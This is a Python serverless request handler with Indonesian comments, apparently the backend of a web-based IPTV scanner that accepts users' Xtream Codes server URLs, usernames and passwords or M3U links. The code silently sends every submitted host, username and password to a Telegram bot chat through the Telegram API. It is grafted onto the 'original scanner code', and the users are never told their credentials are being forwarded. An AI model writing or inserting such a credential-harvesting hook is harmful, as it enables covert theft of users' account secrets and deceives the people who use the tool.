import os
import requests
import urllib.parse
from http.server import BaseHTTPRequestHandler
import json
from datetime import datetime

# ==============================================================================
# FUNGSI UNTUK MENGIRIM DATA KE TELEGRAM
# ==============================================================================
def kirim_ke_telegram(server_url, username, password):
    token = os.environ.get('TELEGRAM_BOT_TOKEN')
    chat_id = os.environ.get('TELEGRAM_CHAT_ID')
    
    # Jika variabel lingkungan di Vercel belum diisi, fungsi dilewati
    if not token or not chat_id:
        return

    # Susun format pesan teks yang rapi
    pesan = (
        f"🚨 *LOG PENGGUNAAN BARU* 🚨\n\n"
        f"🌐 *Server:* {server_url}\n"
        f"👤 *Username:* {username}\n"
        f"🔑 *Password:* {password}\n"
        f"⏰ *Waktu:* {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} WIB"
    )

    url = f"https://api.telegram.org/bot{token}/sendMessage"
    payload = {
        "chat_id": chat_id,
        "text": pesan,
        "parse_mode": "Markdown"
    }
    
    try:
        # Kirim data menggunakan requests library yang sudah ada di proyek Anda
        requests.post(url, json=payload, timeout=5)
    except Exception as e:
        print(f"Gagal mengirim log ke Telegram: {e}")
# ==============================================================================

class handler(BaseHTTPRequestHandler):
    def do_POST(self):
        # Membaca body request
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode('utf-8')
        
        try:
            # Parse data JSON yang dikirim dari frontend web Anda
            data = json.loads(post_data)
            iptv_type = data.get('type')  # 'xtream' atau 'm3u'
            
            # Jika tipe login adalah Xtream Codes, ambil datanya dan kirim ke Telegram
            if iptv_type == 'xtream':
                host = data.get('host')
                username = data.get('username')
                password = data.get('password')
                
                # JALANKAN FUNGSI TELEGRAM DI SINI
                if host and username and password:
                    kirim_ke_telegram(host, username, password)
            
            # Jika tipe login adalah URL M3U langsung
            elif iptv_type == 'm3u':
                m3u_url = data.get('url')
                
                # Opsional: Jika ingin memantau URL M3U mentah yang dimasukkan user
                if m3u_url:
                    kirim_ke_telegram(m3u_url, "-", "-")

        except Exception as e:
            print(f"Gagal memproses data JSON masuk: {e}")

        # ----------------------------------------------------------------------
        # SISA KODE SCANNER ASLI ANDA DI BAWAH INI (JANGAN DIUBAH)
        # Sesuai logika bawaan script Anda untuk melempar balik response ke frontend.
        # ----------------------------------------------------------------------
        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.send_header('Access-Control-Allow-Origin', '*')
        self.end_headers()
        
        # Contoh pengembalian response sukses (sesuaikan dengan return bawaan script asli Anda)
        response = {"status": "success", "message": "Log terkirim dan data sedang diproses"}
        self.wfile.write(json.dumps(response).encode('utf-8'))
        return

    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
        self.end_headers()
        return
